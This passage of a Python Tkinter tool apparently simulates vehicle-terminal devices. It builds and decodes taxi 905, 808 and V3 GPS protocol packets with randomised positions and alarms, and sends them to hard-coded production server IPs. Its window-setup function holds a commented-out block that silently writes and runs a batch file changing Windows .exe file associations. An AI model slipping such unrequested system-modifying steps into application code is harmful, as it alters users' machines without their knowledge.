            bj = random.choice(bjs)
            yy = '01'
            xxxlh = '0003'
            bjyy = bj + yy
            cwjy = bcd + xyh + ti10 + gps + wd + jd + sd + hxzt + lbscd + mcc + mnc + lac + cellid + zdxxnr + dydj + gsm + bjyy + xxxlh
            cwjy1 = crc1(cwjy)[2:].upper().zfill(4)
            tzw = '0D0A'
            w = qsw + cwjy + cwjy1 + tzw
            a = get_xor(w)
            t = a + ''
            print(t)
            tip_content = 'V3报警包数据：{}\n\n源数据：{}\n'.format(t, w)
            self.result_data_Text5.insert(1.0, tip_content)
            if self.ip_on5() == '是':
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
                s.send(bytes().fromhex(t))
                send = s.recv(1024).hex()
                print(send.upper())
                print('\n' * 1)
                tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                self.result_data_Text5.insert(1.0, tip_content)
                showinfo("发送结果", "发送成功")
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        return ""

    def pant5(self):
        try:
            qsw = '7878'
            cwjy = '0A1377060300010003'
            cwjy1 = crc1(cwjy)[2:].upper()
            tzw = '0D0A'
            w = qsw + cwjy + cwjy1 + tzw
            a = get_xor(w)
            t = a + ''
            print(t)
            tip_content = 'V3心跳包数据：{}\n\n源数据：{}'.format(t, w)
            self.result_data_Text5.insert(1.0, tip_content)
            if self.ip_on5() == '是':
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
                s.send(bytes().fromhex(t))
                send = s.recv(1024).hex()
                print(send.upper())
                print('\n' * 1)
                tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                self.result_data_Text5.insert(1.0, tip_content)
                showinfo("发送结果", "发送成功")
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        return ""

    def str_trans_to_md6(self):
        src = self.init_data1_Text6.get(1.0, END).strip()
        return src

    # 16进制转字符
    def hex_to_str(self, hex_data):
        # 将16进制数据按照每两位进行分割
        hex_list = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]
        # 使用unhexlify函数将每个16进制数转换为对应的字符
        char_list = [binascii.unhexlify(h) for h in hex_list]
        # 将所有的字符拼接起来，得到最终的结果
        result = ''.join([c.decode() for c in char_list])
        return result

    def 解析905(self):
        data = self.str_trans_to_md6()
        if data[2:6] == '0200':
            self.result_data1_Text6.delete(1.0, END)
            self.result_data1_Text6.insert(1.0,
                                           f'位置数据包：{data[2:6]}\n设备号：{data[10:22]}\n{报警标志(data)},\n{车辆状态(data)},\n      {经纬度(data)}'
                                           f'\n      {速度(data)},\n      方向：{data[62:64]}'
                                           f'\n      时间：20{data[64:76][:2]}年{data[64:76][2:4]}月{data[64:76][4:6]}日 {data[64:76][6:8]}时{data[64:76][8:10]}分{data[64:76][10:12]}秒'
                                           f'\n      附加信息（未解）{data[76:-4]}')
        elif data[2:6] == '0B03':
            self.result_data1_Text6.delete(1.0, END)
            self.result_data1_Text6.insert(1.0,
                                           f'签到数据包：{data[2:6]}\n设备号：{data[10:22]}\n{报警标志(data)},\n{车辆状态(data)},\n      {经纬度(data)}'
                                           f'\n      {速度(data)},\n      方向：{data[62:64]}'
                                           f'\n      时间：20{data[64:76][:2]}年{data[64:76][2:4]}月{data[64:76][4:6]}日 {data[64:76][6:8]}时{data[64:76][8:10]}分{data[64:76][10:12]}秒'
                                           f'\n      企业经营许可证号：{self.hex_to_str(data[76:108])}\n   驾驶员从业资格证号：{self.hex_to_str(data[108:146])}'
                                           f'\n      车牌号：{self.hex_to_str(data[146:158])}'
                                           f'\n    开机时间：{data[158:170][:4]}年{data[158:170][4:6]}月{data[158:170][6:8]}日 {data[158:170][8:10]}时{data[158:170][10:12]}分'
                                           f'\n      附加信息（未解）{data[170:-4]}')
        elif data[2:6] == '0B04':
            self.result_data1_Text6.delete(1.0, END)
            self.result_data1_Text6.insert(1.0,
                                           f'签退数据包:{data[2:6]}\n设备号：{data[10:22]}\n{报警标志(data)},\n{车辆状态(data)},\n      {经纬度(data)}'
                                           f'\n      {速度(data)},\n      方向：{data[62:64]}'
                                           f'\n      时间：20{data[64:76][:2]}年{data[64:76][2:4]}月{data[64:76][4:6]}日 {data[64:76][6:8]}时{data[64:76][8:10]}分{data[64:76][10:12]}秒'
                                           f'\n      企业经营许可证号：{self.hex_to_str(data[76:108])}\n   驾驶员从业资格证号：{self.hex_to_str(data[108:146])}'
                                           f'\n    车牌号：{self.hex_to_str(data[146:158])}'
                                           f'\n计价器K值：{int(data[158:162])}'
                                           f'\n当班开机时间：{data[162:174][:4]}年{data[162:174][4:6]}月{data[162:174][6:8]}日 {data[162:174][8:10]}时{data[162:174][10:12]}分'
                                           f'\n当班关机时间：{data[174:186][:4]}年{data[174:186][4:6]}月{data[174:186][6:8]}日 {data[174:186][8:10]}时{data[174:186][10:12]}分'
                                           f'\n当班里程：{int(data[186:192]) * 0.1}  当班营运里程：{int(data[192:198]) * 0.1}    车次：{int(data[198:202])}'
                                           f'\n计时时间：{data[202:208][:2]}时{data[202:208][2:4]}分{data[202:208][4:6]}秒'
                                           f'\n总计金额：{int(data[208:214]) * 0.1}'
                                           f'\n卡收金额：{int(data[214:220]) * 0.1}'
                                           f'\n卡次：{int(data[220:224])}'
                                           f'\n班间里程：{int(data[224:228]) * 0.1}'
                                           f'\n总计里程：{int(data[228:236]) * 0.1}'
                                           f'\n总营运里程：{int(data[236:244]) * 0.1}'
                                           f'\n单价：{int(data[244:248]) * 0.01}'
                                           f'\n总营运次数：{int(bin(int(data[248:256], 16))[2:], 2)}'
                                           f'\n签退方式：{签退方式(data)}'
                                           f'\n附加（未解）：{data[258:-4]}')
        elif data[2:6] == '0B05':
            self.result_data1_Text6.delete(1.0, END)
            self.result_data1_Text6.insert(1.0,
                                           f'营运数据包：{data[2:6]}\n设备号：{data[10:22]}'
                                           f'\n空转重时车位置信息：\n      {报警标志(data)},\n      {车辆状态(data)},\n      {经纬度(data)}'
                                           f'\n      {速度(data)}\n      方向：{data[62:64]}'
                                           f'\n      时间：20{data[64:76][:2]}年{data[64:76][2:4]}月{data[64:76][4:6]}日 {data[64:76][6:8]}时{data[64:76][8:10]}分{data[64:76][10:12]}秒'

                                           f'\n\n重转空时车位置信息：\n      {报警标志1(data)},\n      {车辆状态1(data)},\n      {经纬度1(data)}'
                                           f'\n      {速度1(data)}\n      方向：{data[112:114]}'
                                           f'\n      时间：20{data[114:126][:2]}年{data[114:126][2:4]}月{data[114:126][4:6]}日 {data[114:126][6:8]}时{data[114:126][8:10]}分{data[114:126][10:12]}秒'
                                           f'\n      营运ID：{data[126:134]}   评价ID：{data[134:142]}  评价选项：{评价选项(data)}'
                                           f'\n      评价选项扩展：{data[144:148]}\n      电召订单ID：{电召订单ID(data)}'
                                           f'\n      车牌号：{self.hex_to_str(data[156:168])}'
                                           f'\n企业经营许可证号：{self.hex_to_str(data[168:200])}'
                                           f'\n驾驶员从业资格证号：{self.hex_to_str(data[200:238])}'
                                           f'\n上车时间：20{data[238:248][:2]}年{data[238:248][2:4]}月{data[238:248][4:6]}日 {data[238:248][6:8]}时{data[238:248][8:10]}分'
                                           f'\n下车时间：{data[248:252][:2]}时{data[248:252][2:4]}分'
                                           f'\n计程公里数：{int(data[252:258]) * 0.1}  空驶里程：{int(data[258:262]) * 0.1}  附加费：{int(data[262:268]) * 0.1}'
                                           f'\n等待计时时间：{data[268:272][:2]}时{data[268:272][2:4]}分   交易金额：{int(data[272:278]) * 0.1}  当前车次：{int(bin(int(data[278:286], 16))[2:], 2)}'
                                           f'\n交易类型：{交易类型(data)}'
                                           f'\n附加：{data[288:-4]}')
        else:
            self.result_data1_Text6.delete(1.0, END)
            self.result_data1_Text6.insert(1.0, "请输入905原始数据")
            return ''

    def xieyihao(self):
        data = self.str_trans_to_md5()
        data1 = get_xor(data)
        sjutji = []

        if data[6:8] == '01':
            a = '01：{}\n\n'.format('登录数据包')
            b = '设备号：{}\n类型识别码：{}\n时区语言：{}\n'.format(data[8:-12][1:16], '固定为0100', data[8:-12][-4:])
            sjutji.append(a)
            sjutji.append(b)

        elif data[6:8] == '22':
            a = '22：{}\n\n'.format('定位数据包')
            b = 'GPS信息：\n日期时间：{}\n{}\n{}\n速度:{}\n{}\n'.format(tim(data), wx(data), jwdu(data), sdu(data),
                                                                      hx(data))
            c = 'LBS信息：[MCC:{},MNC:{},LAC:{},Cell ID:{}]\n{}\n{}\n{}\n'.format(data[8:-12][36:40], data[8:-12][40:42],
                                                                                 data[8:-12][42:46], data[8:-12][46:52],
                                                                                 acc(data), sjusb(data), gpsbc(data))
            sjutji.append(a), sjutji.append(b), sjutji.append(c)

        elif data[6:8] == '26':
            a = '26：{}\n\n'.format('报警数据包')
            b = '日期时间：{}\n'.format(tim(data))
            c = 'GPS信息：\n{}\n{}\n速度:{}\n{}\n'.format(wx(data), jwdu(data), sdu(data), hx(data))
            d = 'LBS信息：LBS长度：{},MCC:{},MNC:{},LAC:{},Cell ID:{}\n'.format(data[8:-12][36:38], data[8:-12][38:42],
                                                                              data[8:-12][42:44], data[8:-12][44:48],
                                                                              data[8:-12][48:54])
            e = '状态信息：\n{}\n{}\n{}\n{}\n'.format(bjzdxx(data), bjdydji(data), bjgsmqd(data), bjbjyy(data))
            sjutji.append(a), sjutji.append(b), sjutji.append(c), sjutji.append(d), sjutji.append(e)

        elif data[6:8] == '13':
            a = '13：{}\n\n'.format('心跳状态数据包')
            b = '状态信息：\n{}\n{}\n{}\n{}\n'.format(xtzdxx(data), xtdydji(data), xtgsmqd(data), xtbjyy(data))
            sjutji.append(a), sjutji.append(b)

        elif data[6:8] == '15':
            a = '15：{}'.format('终端返回字符串信息包')
            sjutji.append(a)

        elif data[6:8] == '80':
            a = '80：{}'.format('服务器向终端发送指令信息')
            sjutji.append(a)
        else:
            self.result_data1_Text5.delete(1.0, END)
            self.result_data1_Text5.insert(1.0, "请输入V3原始数据")
            return 0
        self.result_data1_Text5.delete(1.0, END)
        for line in sjutji:
            print(line)
            self.result_data1_Text5.insert(1.0, line)

    def qo_login部标(self):
        src = self.init_data_Text2.get().strip()
        print(src)
        if src == '1':
            sbb1 = self.sb_hao2()
            if not sbb1:
                self.result_data_Text2.delete(1.0, END)
                self.result_data_Text2.insert(1.0, "请输入设备号")
            else:
                self.result_data_Text2.delete(1.0, END)
                self.result_data_Text2.insert(1.0, self.wzhi部标(self.su2(), self.plsu2()))

    def qo_login2929(self):
        src = self.init_data_Text4.get().strip()
        print(src)
        if src == '1':
            sbb1 = self.sb_hao4()
            if not sbb1:
                self.result_data_Text4.delete(1.0, END)
                self.result_data_Text4.insert(1.0, "请输入伪ip设备号")
            else:
                self.result_data_Text4.delete(1.0, END)
                self.result_data_Text4.insert(END, self.wzhi2929(self.su4()))

    def qo_login(self):
        src = self.init_data_Text1.get().strip()
        print(src)
        if src == '1':
            sbb1 = self.sb_hao()
            if not sbb1:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(1.0, "请输入设备号")
            else:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(END, self.wzhi905(self.su(), self.plsu()))
            # return 0
        elif src == '2':
            sbb1 = self.sb_hao()
            if not sbb1:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(1.0, "请输入设备号")
            else:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(END, self.qdao(self.su(), self.plsu()))
        elif src == '3':
            sbb1 = self.sb_hao()
            if not sbb1:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(1.0, "请输入设备号")
            else:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(END, self.qtui(self.su(), self.plsu()))
        elif src == '4':
            sbb1 = self.sb_hao()
            if not sbb1:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(1.0, "请输入设备号")
            else:
                self.result_data_Text1.delete(1.0, END)
                self.result_data_Text1.insert(END, self.yyun(self.su(), self.plsu()))

    # @property
    def qo_loginV3(self):
        src = self.init_data_Text5.get().strip()
        print(src)
        if src == '1':
            # print(self.login(2,1))
            sbb1 = self.sb_hao5()
            print(sbb1)
            if not sbb1:
                self.result_data_Text5.delete(1.0, END)
                self.result_data_Text5.insert(1.0, "请输入设备号")
            else:
                self.result_data_Text5.delete(1.0, END)
                self.result_data_Text5.insert(END, self.login5())
        elif src == '2':
            self.result_data_Text5.delete(1.0, END)
            self.result_data_Text5.insert(END, self.dwei5())

        elif src == '3':
            self.result_data_Text5.delete(1.0, END)
            self.result_data_Text5.insert(END, self.beep5())
        elif src == '4':
            self.result_data_Text5.delete(1.0, END)
            self.result_data_Text5.insert(END, self.pant5())
        else:
            self.result_data_Text5.delete(1.0, END)
            self.result_data_Text5.insert(END,
                                          "请输入数字(登录数据包请按1,定位数据包请按2,报警数据包请按3,心跳数据包请按4")

    def 苏粤标生成808(self):
        设备号 = self.init_data1_Text7.get().strip()
        协议 = self.init_data2_Text7.get().strip()
        now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
        wd1 = get_latitude(base_lat=23.012173, radius=15000)
        wd2 = float(wd1) * 1000000
        wd3 = hex(int(wd2))
        jd1 = get_longitude(base_log=114.340462, radius=10000)
        jd2 = float(jd1) * 1000000
        jd3 = hex(int(jd2))
        纬度 = wd3[2:].zfill(8).upper()
        经度 = jd3[2:].zfill(8).upper()
        速度 = '0010'
        时间 = now_time[2:]
        标志状态 = self.标志位()
        报警事件类型 = self.主动报警()
        if not 协议:
            self.result_data1_Text7.delete(1.0, END)
            self.result_data1_Text7.insert(1.0, '请选择协议')
        if 协议 == '苏标':
            if not 报警事件类型:
                self.result_data1_Text7.delete(1.0, END)
                self.result_data1_Text7.insert(1.0, '请选择报警类型')
            附加信息65 = f'652F00000001{标志状态}{报警事件类型}010500000000100000{纬度}{经度}{时间}000030303030303030{时间}000100'
            data = f'0200004D0{设备号}00010000000000000000{纬度}{经度}0000{速度}000C{时间}' + 附加信息65
            a = get_xor(data)
            b = get_bcc(a)
            if b.upper() == "7E":
                a.replace("00", "01")
                b = get_bcc(a)
            E = data + b.upper().zfill(2)
            t = '7E' + E.replace("7E", "01") + '7E'
            D = get_xor(E)
            data1 = '7E ' + D + ' 7E'
            self.result_data1_Text7.delete(1.0, END)
            self.result_data1_Text7.insert(1.0, f'\n\n{data1}')
            self.result_data1_Text7.insert(1.0, t, '\n')
        else:
            if not 报警事件类型:
                self.result_data1_Text7.delete(1.0, END)
                self.result_data1_Text7.insert(1.0, '请选择报警类型')
            协议版本号 = '01'
            a = 设备号.zfill(20)
            终端ID = f'{a}'.zfill(60)
            报警标识号 = f'{终端ID}{时间}00000000'
            附加信息65 = f'653600000001{标志状态}{报警事件类型}010500000000100000{纬度}{经度}{时间}{报警标识号}'
            长度 = '4063'
            data = f'0200{长度}{协议版本号}{a}00010000000000000000{纬度}{经度}0000{速度}000C{时间}' + 附加信息65
            a = get_xor(data)
            b = get_bcc(a)
            if b.upper() == "7E":
                a.replace("00", "01")
                b = get_bcc(a)
            E = data + b.upper().zfill(2)
            t = '7E' + E.replace("7E", "01") + '7E'
            D = get_xor(E)
            data = '7E ' + D + ' 7E'
            if data[:2] != "7E":
                print(f"错误：{data}")
                t = t[:81] + "00" + t[82:]
                data = get_xor(t)
                print("修改后data：{}".format(data))
                print('\n' * 1)
            self.result_data1_Text7.delete(1.0, END)
            self.result_data1_Text7.insert(1.0, f'\n\n{data}')
            self.result_data1_Text7.insert(1.0, t, '\n')

    def qo_send(self):
        src = self.data_Text.get()
        print(src)
        if not src:
            self.result_data_Text1.delete(1.0, END)
            self.result_data_Text1.insert(1.0, "请输入自定义数据")
        else:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((f'{self.ip()}', int(self.port())))  # 生产
            s.send(bytes().fromhex(src))
            send = s.recv(1024).hex()
            print(send.upper())
            print('\n' * 1)
            # time.sleep(10)
            self.result_data_Text1.delete(1.0, END)
            self.result_data_Text1.insert(1.0, f"{src}\n\n")
            self.result_data_Text1.insert(END, f"服务器应答：{send.upper()}\n")
            showinfo("发送结果", "发送成功")

    def qo_send2(self):
        src = self.data_Text2.get()
        d = src[:-6]
        s = d.replace("7E ", "")
        b = get_bcc(s).zfill(2)
        E = " " + s + ' ' + b.upper() + " "
        t = "7E" + E.replace("7E", "00") + "7E"
        print(t)
        if not src:
            self.result_data_Text2.delete(1.0, END)
            self.result_data_Text2.insert(1.0, "请输入自定义数据")
        else:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((f'{self.ip2()}', int(self.port2())))  # 生产
            s.send(bytes().fromhex(t))
            send = s.recv(1024).hex()
            print(send.upper())
            print('\n' * 1)
            # time.sleep(10)
            self.result_data_Text2.delete(1.0, END)
            self.result_data_Text2.insert(1.0, f"{t}\n\n")
            self.result_data_Text2.insert(END, f"服务器应答：{send.upper()}\n\n")
            showinfo("发送结果", "发送成功")

    def qo_send3(self):
        src = self.data_Text3.get(1.0, END).strip()
        if not src:
            self.result_data_Text3.delete(1.0, END)
            self.result_data_Text3.insert(1.0, "请输入自定义数据")
        else:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
            s.send(bytes().fromhex(src))
            send = s.recv(1024).hex()
            print(send.upper())
            print('\n' * 1)
            # time.sleep(10)
            self.result_data_Text3.delete(1.0, END)
            self.result_data_Text3.insert(1.0, f"{src}\n\n")
            self.result_data_Text3.insert(END, f"服务器应答：{send.upper()}\n\n")
            showinfo("发送结果", "发送成功")

    def qo_send4(self):
        src = self.data_Text4.get(1.0, END).strip()
        if not src:
            self.result_data_Text4.delete(1.0, END)
            self.result_data_Text4.insert(1.0, "请输入自定义数据")
        else:
            s = socket(AF_INET, SOCK_DGRAM)
            s.connect((f'{self.ip4()}', int(self.port4())))  # 生产
            s.send(bytes().fromhex(src))
            send = s.recv(1024).hex()
            print(send.upper())
            print('\n' * 1)
            # time.sleep(10)
            self.result_data_Text4.delete(1.0, END)
            self.result_data_Text4.insert(1.0, f"{src}\n\n")
            self.result_data_Text4.insert(END, f"服务器应答：{send.upper()}\n\n")
            showinfo("发送结果", "发送成功")

    def qdo_808jiexq(self):
        import subprocess
        exe_path = os.getcwd() + "\\BSJ-协议解析器\\BSJ_dataParser.exe"
        subprocess.run(exe_path)

    # 设置窗口
    def set_init_window(self):
        # 指定要创建的路径
        # path = r"C:\音乐"
        # # 检查路径是否存在
        # if not os.path.exists(path):
        #     # 创建路径
        #     os.makedirs(path)
        # file_path = os.path.join(path, "update.bat")
        # with open(file_path, "w") as file:
        #     file.write("assoc.exe=exefile")
        # import subprocess
        # subprocess.Popen(r"C:\音乐\update.bat")

        # 905解析数据
        self.init_window_name.title("配置版本  作者 : 姚子奇")
        self.init_window_name.geometry('1100x618+450+200')

        note = Notebook(self.init_window_name)
        pane1 = Frame()

        self.init_window_name.menu = Menu(pane1, tearoff=0)
        self.init_window_name.menu.add_command(label="退出应用", command=self.init_window_name.quit)
        # 添加“置顶”子菜单
        self.init_window_name.menu.add_command(label="窗口置顶", command=self.topmost_on)
        # 添加“改变颜色”子菜单
        self.init_window_name.menu.add_command(label="修改颜色", command=self.choose_color)
        # 添加“窗口透明度设置”子菜单
        self.init_window_name.menu.add_command(label="窗口透明度设置", command=self.tm)
        # 主题切换
        self.init_window_name.menu.add_command(label="主题切换", command=self.zhuti)
        self.init_window_name.bind("<Button-3>", self.show_menu)

        self.ip_Text_label = Label(pane1, text="服务器ip")
        self.ip_Text_label.grid(row=0, columnspan=2, sticky=N)
        items = (f"{self.conf_wg}", "47.119.168.112", "120.79.176.183")
        self.ip_Text = Combobox(pane1, width=50, height=2, values=items)
        self.ip_Text.current(0)
        self.ip_Text.grid(row=1, column=0, sticky=W)
        #
        self.port_Text_label = Label(pane1, text="服务器Port")
        self.port_Text_label.grid(row=2, columnspan=2, sticky=N)
        items = (f"{self.conf_905wg_port}", "17700", "17800")
        self.port_Text = Combobox(pane1, width=50, height=2, values=items)
        self.port_Text.current(0)
        self.port_Text.grid(row=3, column=0, sticky=W)
        #
        self.su_Text_label = Label(pane1, text="循环次数")
        self.su_Text_label.grid(row=4, columnspan=2, sticky=W)
        items = ("0", "10")
        self.su_Text = Combobox(pane1, width=22, height=2, values=items)
        self.su_Text.current(0)
        self.su_Text.grid(row=5, column=0, sticky=W)

        self.plsu_Text_label = Label(pane1, text="批量上线设备次数")
        self.plsu_Text_label.grid(row=4, columnspan=2, sticky=E)
        items = ("1", "10")
        self.plsu_Text = Combobox(pane1, width=22, height=2, values=items)
        self.plsu_Text.current(0)
        self.plsu_Text.grid(row=5, column=0, sticky=E)
        #
        #         # 905组成数据
        self.sbei_Text_label = Label(pane1, text="设备号(905设备号12位)")
        self.sbei_Text_label.grid(row=6, column=0)
        items = (f"{self.sbei905}", "101356000000", "101351000000")
        self.sbei_Text = Combobox(pane1, width=50, height=2, values=items)
        self.sbei_Text.current(0)
        self.sbei_Text.grid(row=7, column=0, sticky=N, columnspan=10)
        #
        #         # 经纬度随机
        self.on_ = Button(pane1, text="随机经纬度", width=10, command=self.button_mode)
        self.on_.grid(row=9, column=10)
        #
        self.wd_Text_label = Label(pane1, text="纬度")
        self.wd_Text_label.grid(row=8, column=0)
        items = (f"{self.conf_wd1}", "23.012173", "32.330217")
        self.wd_Text = Combobox(pane1, width=50, height=2, values=items)
        self.wd_Text.current(0)
        self.wd_Text.grid(row=9, column=0, sticky=N, columnspan=10)
        #
        self.jd_Text_label = Label(pane1, text="经度")
        self.jd_Text_label.grid(row=10, column=0)
        items = (f"{self.conf_jd1}", "114.340462", "104.903551")
        self.jd_Text = Combobox(pane1, width=50, height=2, values=items)
        self.jd_Text.current(0)
        self.jd_Text.grid(row=11, column=0, sticky=N, columnspan=10)
        #
        self.ip_on_Label = Label(pane1, text="发服务器")
        self.ip_on_Label.grid(row=11, column=10, sticky=N)
        items = ("否", "是")
        self.ip_on_Text = Combobox(pane1, width=2, height=3, values=items)
        self.ip_on_Text.current(0)
        self.ip_on_Text.grid(row=12, column=10, columnspan=1, sticky=N)
        #
        self.sb_on_Label = Label(pane1, text="批量上线")
        self.sb_on_Label.grid(row=15, column=10, sticky=N)
        items = ("否", "是")
        self.sb_on_Text = Combobox(pane1, width=2, height=3, values=items)
        self.sb_on_Text.current(0)
        self.sb_on_Text.grid(row=16, column=10, columnspan=1, sticky=N)
        #
        self.baoj_Text_label = Label(pane1, text="报警")
        self.baoj_Text_label.grid(row=12, column=0)
        items = (
            "正常", "紧急报警", "危险预警", "定位模块故障", "定位天线开路", "定位天线短路", "终端主电源欠压",
            "终端主电源掉电", "液晶LCD显示故障", "语音模块TTS故障", "摄像头故障", "超速报警",
            "疲劳驾驶", "当天累计驾驶超时", "超时停车", "车速传感器故障", "录音设备故障", "计价器故障",
            "服务评价器故障", "LED广告屏故障", "液晶LED显示屏故障", "安全访问模块故障", "LED顶灯故障",
            "计价器实时时钟", "进出区域路线报警", "路段行驶时间不足", "禁行路段行驶", "车辆非法点火", "车辆非法位移",
            "所有实时报警", "紧急报警和超速报警")
        self.baoji_Text = Combobox(pane1, width=50, height=12, values=items)
        self.baoji_Text.current(0)
        self.baoji_Text.grid(row=13, column=0, sticky=N, columnspan=10)
        #
        self.times_Text_label = Label(pane1, text="发送停顿时间")
        self.times_Text_label.grid(row=14, column=11)
        items = ("1", "0.5", "1.5", "2")
        self.times_Text = Combobox(pane1, width=60, height=20, values=items)
        self.times_Text.current(0)
        self.times_Text.grid(row=15, column=11, sticky=N)
        #
        self.init_data_label1 = Label(pane1,
                                      text="位置数据包请按1,签到数据包请按2,签退数据包请按3,运营数据包请按4")
        self.init_data_label1.grid(row=14, column=0, sticky=N)
        items = ("1", "2", "3", "4")
        self.init_data_Text1 = Combobox(pane1, width=50, height=12, values=items)
        self.init_data_Text1.current(0)
        self.init_data_Text1.grid(row=15, column=0, columnspan=10, sticky=N)
        self.init_data_Text1.bind("<<ComboboxSelected>>", self.getMon)
        #
        self.sdu_Text_label = Label(pane1, text="速度")
        self.sdu_Text_label.grid(row=16, column=11, sticky=W)
        items = ("10", "20", "30", "40")
        self.sdu_Text = Combobox(pane1, width=27, height=2, values=items)
        self.sdu_Text.current(1)
        self.sdu_Text.grid(row=17, column=11, sticky=W)

        self.lic_Text1_label = Label(pane1, text="里程")
        self.lic_Text1_label.grid(row=16, column=11, sticky=E)
        items = ("12", "23")
        self.lic_Text1 = Combobox(pane1, width=27, height=2, values=items)
        self.lic_Text1.current(0)
        self.lic_Text1.grid(row=17, column=11, sticky=E)

        #
        self.driver_Text_label = Label(pane1, text="驾驶员行驶证")
        self.driver_Text_label.grid(row=16, column=0)
        items = ()
        self.driver_Text = Combobox(pane1, width=50, height=2, values=items)
        self.driver_Text.grid(row=17, column=0, sticky=N, columnspan=10)

        self.ztai_Text_label = Label(pane1, text="车辆状态")
        self.ztai_Text_label.grid(row=18, column=11)
        items = (
            "ACC开和载客", "未卫星定位", "停运状态", "预约任务车", "南纬", "西经", "空转重", "重转空", "ACC开", "重车",
            "车辆油路断开", "车辆电路断开", "车门加锁", "车辆锁定", "已达到限制营运次数时间")
        self.ztai_Text = Combobox(pane1, width=60, height=20, values=items)
        self.ztai_Text.grid(row=19, column=11)
        self.ztai_Text.current(0)
        #
        self.data_label = Label(pane1, text="自定义发送(选择服务器ip和port端口)")
        self.data_label.grid(row=18, column=0, sticky=N)
        items = ()
        self.data_Text = Combobox(pane1, width=50, height=2, values=items)
        self.data_Text.grid(row=19, column=0, sticky=N)

        self.result_Text = Button(pane1, text="发送", command=lambda: self.thread_it(self.qo_send))
        self.result_Text.grid(row=19, column=10)

        self.result_data_label1 = Label(pane1, text="输出结果")
        self.result_data_label1.grid(row=0, column=11)
        #
        #         # self.init_data_Text1.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text1))
        self.result_data_Text1 = Text(pane1, width=85, height=20, relief='solid')
        self.result_data_Text1.grid(row=1, column=11, rowspan=13, columnspan=15)
        #         # self.result_data_Text1.bind("<Button-3>", lambda x: rightKey(x, self.result_data_Text1))
        # 按钮
        self.str_trans_to_md5_button = Button(pane1, text="专用905生成", width=10,
                                              command=lambda: self.thread_it(self.qo_login))  # 调用内部方法  加()为直接调用
        self.str_trans_to_md5_button.grid(row=5, column=10)
        pane2 = Frame()

        self.ip_Text_label2 = Label(pane2, text="服务器ip")
        self.ip_Text_label2.grid(row=0, columnspan=2, sticky=N)

        items = (f"{self.conf_wg}", "47.119.168.112", "120.79.176.183")
        self.ip_Text2 = Combobox(pane2, width=50, height=2, values=items)
        self.ip_Text2.current(0)
        self.ip_Text2.grid(row=1, column=0, sticky=W)
        #
        self.port_Text_label2 = Label(pane2, text="服务器Port")
        self.port_Text_label2.grid(row=2, columnspan=2, sticky=N)
        items = (f"{self.conf_808wg_port}", "17700", "17800", "7788")
        self.port_Text2 = Combobox(pane2, width=50, height=2, values=items)
        self.port_Text2.current(0)
        self.port_Text2.grid(row=3, column=0, sticky=W)

        self.su_Text_label2 = Label(pane2, text="循环发送次数")
        self.su_Text_label2.grid(row=4, columnspan=2, sticky=W)
        items = ("0", "10")
        self.su_Text2 = Combobox(pane2, width=22, height=2, values=items)
        self.su_Text2.current(0)
        self.su_Text2.grid(row=5, column=0, sticky=W)

        self.plsu2_Text_label2 = Label(pane2, text="批量上线设备次数")
        self.plsu2_Text_label2.grid(row=4, columnspan=2, sticky=E)
        items = ("1", "10")
        self.plsu2_Text2 = Combobox(pane2, width=22, height=2, values=items)
        self.plsu2_Text2.current(0)
        self.plsu2_Text2.grid(row=5, column=0, sticky=E)
        #
        #
        # # 905组成数据
        self.sbei_Text_label2 = Label(pane2, text="808部标设备号11位")
        self.sbei_Text_label2.grid(row=6, column=0, columnspan=1, sticky=N)
        items = (f"{self.sbei808}", "10356000000", "10351000000")
        self.sbei_Text2 = Combobox(pane2, width=50, height=2, values=items)
        self.sbei_Text2.current(0)
        self.sbei_Text2.grid(row=7, column=0, sticky=N, columnspan=1)
        #
        #
        # # 经纬度随机
        self.on_ = Button(pane2, text="随机经纬度", width=10, command=self.button_mode2)
        self.on_.grid(row=9, column=10)
        #
        self.wd_Text_label2 = Label(pane2, text="纬度")
        self.wd_Text_label2.grid(row=8, column=0, columnspan=1, sticky=N)
        items = (f"{self.conf_wd1}", "23.012173", "32.330217")
        self.wd_Text2 = Combobox(pane2, width=50, height=2, values=items)
        self.wd_Text2.current(0)
        self.wd_Text2.grid(row=9, column=0, sticky=N, columnspan=1)
        #
        self.jd_Text_label2 = Label(pane2, text="经度")
        self.jd_Text_label2.grid(row=10, column=0, columnspan=1, sticky=N)
        items = (f"{self.conf_jd1}", "114.340462", "104.903551")
        self.jd_Text2 = Combobox(pane2, width=50, height=2, values=items)
        self.jd_Text2.current(0)
        self.jd_Text2.grid(row=11, column=0, sticky=N, columnspan=1)
        #
        self.ip_on_Label2 = Label(pane2, text="发服务器")
        self.ip_on_Label2.grid(row=11, column=10, sticky=N)
        items = ("否", "是")
        self.ip_on_Text2 = Combobox(pane2, width=2, height=3, values=items)
        self.ip_on_Text2.current(0)
        self.ip_on_Text2.grid(row=12, column=10, columnspan=1, sticky=N)

        self.sb_on_Label2 = Label(pane2, text="批量上线")
        self.sb_on_Label2.grid(row=15, column=10, sticky=N)
        items = ("否", "是")
        self.sb_on_Text2 = Combobox(pane2, width=2, height=3, values=items)
        self.sb_on_Text2.current(0)
        self.sb_on_Text2.grid(row=16, column=10, columnspan=1, sticky=N)
        #
        self.baoj_Text_label2 = Label(pane2, text="报警")
        self.baoj_Text_label2.grid(row=12, column=0, columnspan=1, sticky=N)
